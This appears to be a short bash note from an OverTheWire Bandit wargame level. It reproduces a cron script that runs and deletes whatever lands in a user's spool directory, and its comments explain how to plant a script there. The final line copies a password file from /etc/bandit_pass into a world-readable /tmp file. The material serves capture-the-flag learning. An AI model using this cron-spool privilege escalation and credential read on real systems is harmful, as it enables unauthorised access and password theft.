#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deletting all scripts in /var/spool/$myname:"

for i in * .*;
do
		if [ "$i" != "." -a "$i" != ".." ];
		then
			echo "Handling $i"
			timeout -s 9 50 ./$i
			rm -f ./$i
		fi
done

# The above script is running from Cron
# the creative process is that the above
# will execute everything from /var/spool/$myname
# with the right permissions.
# So try to get something in that folder to be called
# by the main script. Bear in mind this will be 
# deleted after use.

cat /etc/bandit_pass/banditX > /tmp/me.txt # << this is tricky
				# If send to the current user, the script will not
				# have the right permissions. So send it directly
				# to temp, so everybody can read it
